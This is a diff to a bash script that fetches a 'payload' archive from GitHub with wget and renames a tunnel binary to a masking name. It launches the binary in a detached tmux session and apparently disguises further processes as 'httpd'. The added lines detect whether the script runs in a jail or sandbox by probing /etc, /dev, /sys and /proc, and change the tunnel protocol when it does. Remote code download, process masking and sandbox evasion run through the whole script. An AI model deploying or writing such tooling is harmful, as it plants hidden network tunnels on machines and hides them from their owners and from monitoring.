@@ -1,6 +1,16 @@
 #!/usr/bin/env bash
 ## needed tmux sed grep envsubst
 
+## where are we
+c=$(builtin compgen -G '/etc/cpa*')
+d=$(builtin compgen -G '/dev/*')
+s=$(builtin compgen -G '/sys/*')
+p=$(builtin compgen -G '/proc/*')
+jail=
+if [ -n "$c" -o -z "$d" -o -z "$s" -o -z "$p" ]; then ## we are in a jail
+    jail=1
+fi
+
 ## get payload
 BRANCH=master
 wget https://github.com/untoreh/scripts/archive/${BRANCH}.tar.gz
@@ -60,8 +70,12 @@ fi
 ## mask
 mv "$TNL_PATH" "$(dirname ${TNL_PATH})/${TNL_MASK}"
 ## config with needed vars
-TNL_REMOTE="$TNL_REMOTE" \
-    envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
+if [ "$jail" ]; then
+    TNL_PROTO="ss"
+fi
+export TNL_REMOTE="$TNL_REMOTE" \
+       TNL_PROTO
+envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
 tmx new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}
 
 OBJ_MASK=${OBJ_MASK:-httpd}
